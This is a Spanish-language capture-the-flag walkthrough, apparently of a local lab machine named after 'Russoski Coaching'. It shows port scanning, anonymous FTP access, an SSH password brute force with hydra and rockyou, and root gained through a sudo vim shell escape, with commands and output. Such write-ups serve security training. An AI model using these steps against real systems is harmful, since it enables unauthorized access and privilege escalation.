## Enumeración

- Realizo un escaneo en búsqueda de puertos abiertos
```
nmap -p- --open --min-rate 5000 -n -sS -Pn 172.17.0.2 -oG puertos
```
Se encuentra los puertos **21 (FTP), 22 (SSH), 80 (HTTP)**

- Se realiza un escaneo en busca de versiones de servicios.
```
nmap -p21,22,80 -sCV 172.17.0.2 -oN escaneo
```
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0             667 Jun 18  2024 chat-gonza.txt
|_-rw-r--r--    1 0        0             315 Jun 18  2024 pendientes.txt
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 60:05:bd:a9:97:27:a5:ad:46:53:82:15:dd:d5:7a:dd (ECDSA)
|_  256 0e:07:e6:d4:3b:63:4e:77:62:0f:1a:17:69:91:85:ef (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Russoski Coaching
```
Se encuentra que se puede ingresar a FTP con el usuario **anonimous**

```
ftp 172.17.0.2
```

Se encuentran dos archivos **chat-gonza.txt** y **pendientes.txt**
Al abrir ambos archivos y leerlos, se consigue dos posibles usuarios (gonza , russoski) y que la seguridad de russoski en débil.
También al inspeccionar el código fuente de la pagina web se encuentra:
```
 </div>         
        </div>         <! -- Utilizando el mismo usuario para todos mis servicios, podré recordarlo fácilmente -->
    </section>
```
Llegamos a la conclusión que el usuario es el mismo para todos los servicios y su contraseña es débil.

## Explotación

Realizo búsqueda de contraseña con hydra y el diccionario rockyou
```
hydra -l russoski -P /usr/share/wordlist/rockyou.txt ssh://172.17.0.2

hydra -l gonza -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2

```

Al realizar la búsqueda encuentro contraseña para russoski
```
[22][ssh] host: 172.17.0.2   login: russoski   password: iloveme
```

Ya con el usuario y contraseña ingeso a travez de ssh
```
ssh russoski@172.17.0.2
password: iloveme 
```

## Escalada de privilegio
Para escalar privilegio realizo búsqueda de permisos
```
russoski@29184fdaf35d:~$ sudo -l
Matching Defaults entries for russoski on 29184fdaf35d:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User russoski may run the following commands on 29184fdaf35d:
    (root) NOPASSWD: /usr/bin/vim
```

Al realizar la búsqueda encuentro que puedo utilizar vim como root sin contraseña.

```
sudo vim

:!/bin/bash
root@29184fdaf35d:/home/russoski# id
uid=0(root) gid=0(root) groups=0(root)
```

